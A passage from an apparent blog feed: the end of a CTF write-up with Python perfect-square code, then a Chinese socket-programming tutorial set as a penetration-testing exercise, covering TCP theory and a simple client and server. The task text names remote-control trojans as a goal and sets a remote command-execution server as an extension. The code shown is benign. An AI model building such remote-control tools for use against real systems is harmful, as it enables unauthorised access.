class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;square root not defined for negative numbers&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = <span class="built_in">divmod</span>(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_perfect_square</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal &quot;digit&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TEST functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_is_perfect_square</span>():</span></span><br><span class="line">    print(<span class="string">&quot;Testing is_perfect_square&quot;</span>)</span><br><span class="line">    testsuit = [<span class="number">4</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">18</span>, <span class="number">901</span>, <span class="number">1000</span>, <span class="number">1024</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> testsuit:</span><br><span class="line">        print(<span class="string">&quot;Is &quot;</span>, n, <span class="string">&quot; a perfect square?&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_perfect_square(n)!= -<span class="number">1</span>:</span><br><span class="line">            print(<span class="string">&quot;Yes!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;Nope&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_is_perfect_square()</span><br></pre></td></tr></table></figure>


<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="m1bmp"><a href="#m1bmp" class="headerlink" title="m1bmp"></a>m1bmp</h2><p>zsteg一把梭</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>网络通信开发基础</title>
    <url>/2021/09/26/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>脚本开发之网络通信开发基础<a id="more"></a></p>
<h1 id="任务标题：-网络通信开发基础"><a href="#任务标题：-网络通信开发基础" class="headerlink" title="任务标题： 网络通信开发基础"></a>任务标题： 网络通信开发基础</h1><h2 id="任务目标："><a href="#任务目标：" class="headerlink" title="任务目标："></a>任务目标：</h2><p>建立 socket 连接通道，可以相互之间传输数据</p>
<h2 id="推荐语言："><a href="#推荐语言：" class="headerlink" title="推荐语言："></a>推荐语言：</h2><p>python、c、c#、powershell</p>
<h2 id="任务描述："><a href="#任务描述：" class="headerlink" title="任务描述："></a>任务描述：</h2><p>在实际的渗透中，协议是建立据点网络通道的基础，可以通过网络通道对内部的服务器进行控制</p>
<p>本关主要锻炼大家对于协议的理解和对网络通道建立的使用方法，有了这个基础可以实现一些比如远控木马、端口扫描、服务爆破方面的工具。</p>
<h2 id="报告要求"><a href="#报告要求" class="headerlink" title="报告要求"></a>报告要求</h2><p>1、理解TCP、UDP协议的原理及特点</p>
<p>2、分别使用 TCP、UDP 协议实现数据通讯</p>
<h2 id="扩展任务"><a href="#扩展任务" class="headerlink" title="扩展任务"></a>扩展任务</h2><p>客户端发送命令，服务端接收命令并执行</p>
<hr>
<p>​        对TCP/IP、UDP、Socket编程这些词你不会很陌生吧？随着网络技术的发展，这些词充斥着我们的耳朵。我们深谙信息交流的价值，那网络中进程之间如何通信，如我们每天打开浏览器浏览网页时，浏览器的进程怎么与web服务器通信的？当你用QQ聊天时，QQ进程怎么与服务器或你好友所在的QQ进程通信？这些都得靠socket？那什么是socket？本文将围绕以下几方面开展</p>
<ol>
<li>什么是TCP/IP、UDP？</li>
<li>Socket在哪里呢？</li>
<li>Socket是什么呢？</li>
<li>如何使用它们？</li>
</ol>
<h1 id="网络中进程之间如何通信？"><a href="#网络中进程之间如何通信？" class="headerlink" title="网络中进程之间如何通信？"></a>网络中进程之间如何通信？</h1><p>本地的进程间通信（IPC）有很多种方式，但可以总结为下面4类：</p>
<ul>
<li>消息传递（管道、FIFO、消息队列）</li>
<li>同步（互斥量、条件变量、读写锁、文件和写记录锁、信号量）</li>
<li>共享内存（匿名的和具名的）</li>
<li>远程过程调用（Solaris门和Sun RPC）</li>
</ul>
<p>网络中进程之间如何通信？首要解决的问题是如何唯一标识一个进程，否则通信无从谈起！在本地可以通过进程PID来唯一标识一个进程，但是在网络中这是行不通的。其实TCP/IP协议族已经帮我们解决了这个问题，网络层的“<strong>ip地址</strong>”可以唯一标识网络中的主机，而传输层的“<strong>协议+端口</strong>”可以唯一标识主机中的应用程序（进程）。这样利用三元组（ip地址，协议，端口）就可以标识网络的进程了，网络中的进程通信就可以利用这个标志与其它进程进行交互。</p>
<p>使用TCP/IP协议的应用程序通常采用应用编程接口：UNIX BSD的套接字（socket）和UNIX System V的TLI（已经被淘汰），来实现网络进程之间的通信。就目前而言，几乎所有的应用程序都是采用socket，而现在又是网络时代，网络中进程通信是无处不在，这就是我为什么说“一切皆socket”。</p>
<h1 id="什么是Socket？"><a href="#什么是Socket？" class="headerlink" title="什么是Socket？"></a>什么是Socket？</h1><p>我们先通过一张图，大致的了解一下啊socket的位置</p>
<img src="http://img.npfs06.top/20210925234213.png" style="zoom:80%;">

<p>​        所谓套接字(Socket)，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议根进行交互的接口，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p>
<p>那么，如何去使用socket呢？</p>
<p>​        前人已经给我们做了好多的事了，网络间的通信也就简单了许多，但毕竟还是有挺多工作要做的。以前听到Socket编程，觉得它是比较高深的编程知识，但是只要弄清Socket编程的工作原理，神秘的面纱也就揭开了。<br>​         举一个生活中的场景。你要打电话给一个朋友，先拨号，朋友听到电话铃声后提起电话，这时你和你的朋友就建立起了连接，就可以讲话了。等交流结束，挂断电话结束此次交谈。  生活中的场景就解释了这工作原理，也许TCP/IP协议族就是诞生于生活中，这也不一定。</p>
<img src="http://img.npfs06.top/20210925234357.png" style="zoom:80%;">

<p>​        先从服务器端说起。服务器端先初始化Socket，然后与端口绑定(bind)，对端口进行监听(listen)，调用accept阻塞，等待客户端连接。在这时如果有个客户端初始化一个Socket，然后连接服务器(connect)，如果连接成功，这时客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把回应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束。</p>
<h2 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h2><p>这里已python为例，讲解如何创建socket</p>
<p>在python中，使用socket模块的函数就可以完成，基本格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">socket.socket(AddressFamily, Type, protocal=<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取tcp/ip套接字</span></span><br><span class="line">tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取udp/ip套接字</span></span><br><span class="line">udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ...这里是使用套接字的功能（省略）...</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 不用的时候，关闭套接字</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>


<h2 id="Socket-类型"><a href="#Socket-类型" class="headerlink" title="Socket 类型"></a>Socket 类型</h2><p>套接字格式：</p>
<p>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p>
<table>
<thead>
<tr>
<th>socket类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>socket.AF_UNIX</td>
<td>只能够用于单一的Unix系统进程间通信</td>
</tr>
<tr>
<td>socket.AF_INET</td>
<td>服务器之间网络通信</td>
</tr>
<tr>
<td>socket.AF_INET6</td>
<td>IPv6</td>
</tr>
<tr>
<td>socket.SOCK_STREAM</td>
<td>流式socket , for TCP</td>
</tr>
<tr>
<td>socket.SOCK_DGRAM</td>
<td>数据报式socket , for UDP</td>
</tr>
<tr>
<td>socket.SOCK_RAW</td>
<td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td>
</tr>
<tr>
<td>socket.SOCK_SEQPACKET</td>
<td>可靠的连续数据包服务</td>
</tr>
<tr>
<td>创建TCP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</td>
</tr>
<tr>
<td>创建UDP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td>
</tr>
</tbody></table>
<h2 id="Socket-函数"><a href="#Socket-函数" class="headerlink" title="Socket 函数"></a>Socket 函数</h2><p>注意点:</p>
<p>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。</p>
<p>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p>
<table>
<thead>
<tr>
<th>socket函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>服务端socket函数</td>
<td></td>
</tr>
<tr>
<td>s.bind(address)</td>
<td>将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.</td>
</tr>
<tr>
<td>s.listen(backlog)</td>
<td>开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。</td>
</tr>
<tr>
<td>客户端socket函数</td>
<td></td>
</tr>
<tr>
<td>s.connect(address)</td>
<td>连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td>s.connect_ex(adddress)</td>
<td>功能与connect(address)相同，但是成功返回0，失败返回errno的值。</td>
</tr>
<tr>
<td>公共socket函数</td>
<td></td>
</tr>
<tr>
<td>s.recv(bufsize[,flag])</td>
<td>接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td>s.send(string[,flag])</td>
<td>发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td>s.sendall(string[,flag])</td>
<td>完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.recvfrom(bufsize[.flag])</td>
<td>接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td>s.sendto(string[,flag],address)</td>
<td>发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字。</td>
</tr>
<tr>
<td>s.getpeername()</td>
<td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td>s.getsockname()</td>
<td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td>s.setsockopt(level,optname,value)</td>
<td>设置给定套接字选项的值。</td>
</tr>
<tr>
<td>s.getsockopt(level,optname[.buflen])</td>
<td>返回套接字选项的值。</td>
</tr>
<tr>
<td>s.settimeout(timeout)</td>
<td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td>s.gettimeout()</td>
<td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td>s.fileno()</td>
<td>返回套接字的文件描述符。</td>
</tr>
<tr>
<td>s.setblocking(flag)</td>
<td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td>s.makefile()</td>
<td>创建一个与该套接字相关连的文件</td>
</tr>
</tbody></table>
<h1 id="TCP的原理及特点"><a href="#TCP的原理及特点" class="headerlink" title="TCP的原理及特点"></a>TCP的原理及特点</h1><p>TCP全称为 “传输控制协议(Transmission Control Protocol”). 从名字就能看出来,TCP协议 要对数据的传输进行一个详细的控制。</p>
<p>TCP协议特点：面向连接，提供可靠的服务，有流量控制，拥塞控制，无重复、无丢失、无差错，面向字节流(把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块)，只能是点对点，首部 20 字节，全双工</p>
<h2 id="tcp首部格式"><a href="#tcp首部格式" class="headerlink" title="tcp首部格式"></a>tcp首部格式</h2><img src="http://img.npfs06.top/20210926000228.png" style="zoom:80%;">



<ul>
<li><strong>序号</strong> <strong>：</strong>用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。</li>
<li><strong>确认号</strong> <strong>：</strong>期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。</li>
<li><strong>数据偏移</strong> ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。</li>
<li><strong>确认 ACK</strong> ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。</li>
<li><strong>同步 SYN</strong> <strong>：</strong>在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。</li>
<li><strong>终止 FIN</strong> <strong>：</strong>用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放运输连接。</li>
<li><strong>窗口</strong> <strong>：</strong>窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。</li>
</ul>
<p><strong>TCP连接:SYN ACK RST UTG PSH FIN</strong></p>
<p><strong>SYN：同步标志</strong></p>
<p>同步序列编号(Synchronize Sequence Numbers)栏有效。该标志仅在三次握手建立TCP连接时有效。它提示TCP连接的服务端检查序列编号，该序列编号为TCP连接初始端(一般是客户端)的初始序列编号。</p>
<p><strong>ACK：确认标志</strong></p>
<p>确认编号(Acknowledgement Number)栏有效。大多数情况下该标志位是置位的。TCP报头内的确认编号栏内包含的确认编号(w+1，Figure-1)为下一个预期的序列编号，同时提示远端系统已经成功接收所有数据。</p>
<p><strong>RST：复位标志</strong></p>
<p>复位标志有效。用于复位相应的TCP连接。</p>
<p><strong>URG：紧急标志</strong></p>
<p>紧急(The urgent pointer) 标志有效。紧急标志置位，</p>
<p><strong>PSH：推标志</strong></p>
<p>该标志置位时，接收端不将该数据进行队列处理，而是尽可能快将数据转由应用处理。在处理 telnet 或 rlogin 等交互模式的连接时，该标志总是置位的。</p>
<p><strong>FIN：结束标志</strong></p>
<p>带有该标志置位的数据包用来结束一个TCP回话，但对应端口仍处于开放状态，准备接收后续数据。</p>
<p>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.其中，对于我们日常的分析有用的就是前面的五个字段。它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。</p>
<p>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。</p>
<p>TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。</p>
<p>RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；</p>
<p>而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。</p>
<p>PSH为1的情况，一般只出现在DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。</p>
<p>WireShark抓包的情况</p>
<img src="http://img.npfs06.top/20210926000314.png" style="zoom:80%;">



<p>其中目的端口为0885（16进制），转换成10进制就为2181</p>
<h2 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h2><p>所谓三次握手(Three-way Handshake)，是指建立一个 TCP 连接时，需要客户端和服务器总共发送3个报文。</p>
<p>三次握手的目的是连接服务器指定端口，建立 TCP 连接，并同步连接双方的序列号和确认号，交换 TCP 窗口大小信息。在 socket 编程中，客户端执行 connect() 时。将触发三次握手。</p>
<p>三次握手过程的示意图如下：</p>
<img src="http://img.npfs06.top/20210926000502.png" style="zoom:80%;">


<p>用下面的比喻就是</p>
<blockquote>
<p>C：约么？</p>
<p>S：约</p>
<p>C：好的</p>
<p>约会</p>
</blockquote>
<ul>
<li><strong>第一次握手</strong>：<br>客户端将TCP报文<strong>标志位SYN置为1</strong>，随机产生一个序号值seq=J，保存在TCP首部的序列号(Sequence Number)字段里，指明客户端打算连接的服务器的端口，并将该数据包发送给服务器端，发送完毕后，客户端进入<code>SYN_SENT</code>状态，等待服务器端确认。</li>
<li><strong>第二次握手</strong>：<br>服务器端收到数据包后由标志位SYN=1知道客户端请求建立连接，服务器端将TCP报文<strong>标志位SYN和ACK都置为1</strong>，ack=J+1，随机产生一个序号值seq=K，并将该数据包发送给客户端以确认连接请求，服务器端进入<code>SYN_RCVD</code>状态。</li>
<li><strong>第三次握手</strong>：<br>客户端收到确认后，检查ack是否为J+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=K+1，并将该数据包发送给服务器端，服务器端检查ack是否为K+1，ACK是否为1，如果正确则连接建立成功，客户端和服务器端进入<code>ESTABLISHED</code>状态，完成三次握手，随后客户端与服务器端之间可以开始传输数据了。</li>
</ul>
<p>注意:我们上面写的ack和ACK，不是同一个概念：</p>
<ul>
<li>小写的ack代表的是头部的确认号Acknowledge number， 缩写ack，是对上一个包的序号进行确认的号，ack=seq+1。</li>
<li>大写的ACK，则是我们上面说的TCP首部的标志位，用于标志的TCP包是否对上一个包进行了确认操作，如果确认了，则把ACK标志位设置成1。</li>
</ul>
<p>至此，三次握手完成，一个TCP连接建立完成，接下来就是双端传输数据了</p>
<h3 id="为什么需要三次握手？"><a href="#为什么需要三次握手？" class="headerlink" title="为什么需要三次握手？"></a>为什么需要三次握手？</h3><p>我们假设client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。</p>
<p>本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。</p>
<p>假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。</p>
<p>所以，采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求建立连接。</p>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。在socket编程中，这一过程由客户端或服务端任一方执行close来触发。<br>由于TCP连接是全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN。首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭。</p>
<p>四次挥手过程的示意图如下：</p>
<img src="http://img.npfs06.top/20210926000723.png" style="zoom:80%;">

<p>挥手请求可以是Client端，也可以是Server端发起的，我们假设是Client端发起：</p>
<ul>
<li><strong>第一次挥手</strong>： Client端发起挥手请求，向Server端发送标志位是FIN报文段，设置序列号seq，此时，Client端进入<code>FIN_WAIT_1</code>状态，这表示Client端没有数据要发送给Server端了。</li>
<li><strong>第二次分手</strong>：Server端收到了Client端发送的FIN报文段，向Client端返回一个标志位是ACK的报文段，ack设为seq加1，Client端进入<code>FIN_WAIT_2</code>状态，Server端告诉Client端，我确认并同意你的关闭请求。</li>
<li><strong>第三次分手</strong>： Server端向Client端发送标志位是FIN的报文段，请求关闭连接，同时Client端进入<code>LAST_ACK</code>状态。</li>
<li><strong>第四次分手</strong> ： Client端收到Server端发送的FIN报文段，向Server端发送标志位是ACK的报文段，然后Client端进入<code>TIME_WAIT</code>状态。Server端收到Client端的ACK报文段以后，就关闭连接。此时，Client端等待<strong>2MSL</strong>的时间后依然没有收到回复，则证明Server端已正常关闭，那好，Client端也可以关闭连接了。</li>
</ul>
<h1 id="TCP实现socket的简单通信（python）"><a href="#TCP实现socket的简单通信（python）" class="headerlink" title="TCP实现socket的简单通信（python）"></a>TCP实现socket的简单通信（python）</h1><h2 id="客户端编程"><a href="#客户端编程" class="headerlink" title="客户端编程"></a>客户端编程</h2><p>    以下代码是客户端向新浪新闻服务器发送TCP请求，然后将接收到的信息输出。</p>
<ol>
<li>首先是创建一个socket连接，使用IPv4协议和TCP协议。</li>
<li>然后连接百度服务器，80端口是Web服务的标准端口，其他服务都有对应的标准端口号，例如SMTP服务是25端口，FTP服务是21端口，等等。</li>
<li>将接收到的数据进行输出。</li>
</ol>
<p>这里以百度为例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/26 10:23</span></span><br><span class="line"><span class="comment"># @Author  : npfs</span></span><br><span class="line"><span class="comment"># @FileName: 客户端</span></span><br><span class="line"><span class="comment"># @Blog    ：http://npfs06.top</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建socket AF_INET指定使用IPv4协议（IPv6-AF_INET6） SOCK_STREAM指定使用面向流的TCP协议</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 80端口是Web服务的标准端口。</span></span><br><span class="line"><span class="comment"># 其他服务都有对应的标准端口号: SMTP服务是25端口，FTP服务是21端口。</span></span><br><span class="line">s.connect((<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="number">80</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送TCP数据。将string中的数据发送到连接的套接字。同时接收数据</span></span><br><span class="line">s.send(<span class="string">b&#x27;GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: close\r\n\r\n&#x27;</span>)</span><br><span class="line">buffer = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>  <span class="literal">True</span>:</span><br><span class="line">    d = s.recv(<span class="number">1024</span>)   <span class="comment">#接受TCP套接字的数据。数据以字符串形式返回，</span></span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        <span class="comment"># print(d)</span></span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">b&#x27;&#x27;</span>.join(buffer)</span><br><span class="line">header, html = data.split(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line">print(header.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">print(html.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210926103601.png" style="zoom:80%;">





<h2 id="服务端编程"><a href="#服务端编程" class="headerlink" title="服务端编程"></a>服务端编程</h2><p>    以下代码是服务器端代码。</p>
<ol>
<li>首先创建一个基于IPv4和TCP协议的Socket。</li>
<li>绑定了本地的21567端口（小于1024的端口号必须要有管理员权限才能绑定）。</li>
<li>设置最大连接数为5，由于考虑到服务器可能同时响应多个客户端的请求，所以，每个连接都需要一个新的进程或者新的线程来处理。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/9/26 10:23</span></span><br><span class="line"><span class="comment"># @Author  : npfs</span></span><br><span class="line"><span class="comment"># @FileName: TCP服务端</span></span><br><span class="line"><span class="comment"># @Blog    ：http://npfs06.top</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;=====================时间戳TCP服务器=====================&quot;</span>)</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;127.0.0.1&#x27;</span>  <span class="comment">#主机号为空白表示可以使用任何可用的地址。</span></span><br><span class="line">PORT = <span class="number">21567</span>  <span class="comment">#端口号</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span>  <span class="comment">#接收数据缓冲大小</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM) <span class="comment">#创建TCP服务器套接字</span></span><br><span class="line">tcpSerSock.bind(ADDR)  <span class="comment">#套接字与地址绑定</span></span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>) <span class="comment">#监听连接，同时连接请求的最大数目</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   print(<span class="string">&#x27;等待客户端的连接...&#x27;</span>)</span><br><span class="line">   tcpCliSock, addr = tcpSerSock.accept()   <span class="comment">#接收客户端连接请求</span></span><br><span class="line">   print(<span class="string">&#x27;取得连接:&#x27;</span>, addr)</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       data = tcpCliSock.recv(BUFSIZ)  <span class="comment">#连续接收指定字节的数据，接收到的是字节数组</span></span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> data:  <span class="comment">#如果数据空白，则表示客户端退出，所以退出接收</span></span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">       <span class="comment">#tcpCliSock.send(&#x27;[%s] 